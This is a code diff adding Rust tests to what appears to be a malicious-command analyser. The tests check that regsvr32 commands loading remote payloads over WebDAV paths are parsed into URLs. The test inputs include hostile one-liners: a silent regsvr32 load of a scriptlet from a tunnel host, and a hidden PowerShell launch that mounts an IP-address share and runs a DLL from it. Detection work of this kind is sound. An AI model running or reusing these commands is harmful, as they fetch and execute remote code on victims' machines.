@@ -9554,6 +9554,27 @@ mod regsvr32_tests {
     }
 
     #[test]
+    fn regsvr32_unc_webdav_target_emits_url_argument() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { url, .. }
+                    if url == "https://travel-sagem-distant-potential.trycloudflare.com/loader.sct"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 UNC/WebDAV target URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn regsvr32_local_scriptlet_resolves_prior_download_source() {
         let report = crate::analyze(
             br#"curl -o payload.sct https://regsvr32-local.example/payload.sct
@@ -17847,6 +17868,26 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
             }),
             "regsvr32 downloaded load target in deob text was not typed: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_webdav_target_in_deob_text_resolves_http_url() {
+        let report = crate::analyze(
+            br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\  regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd.contains(r#"regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#)
+                            && url == "http://45.9.74.36:8888/163141239210479.dll"
+                )
+            }),
+            "regsvr32 WebDAV target in deob text was not typed: {:?}",
+            report.traits
         );
     }
 
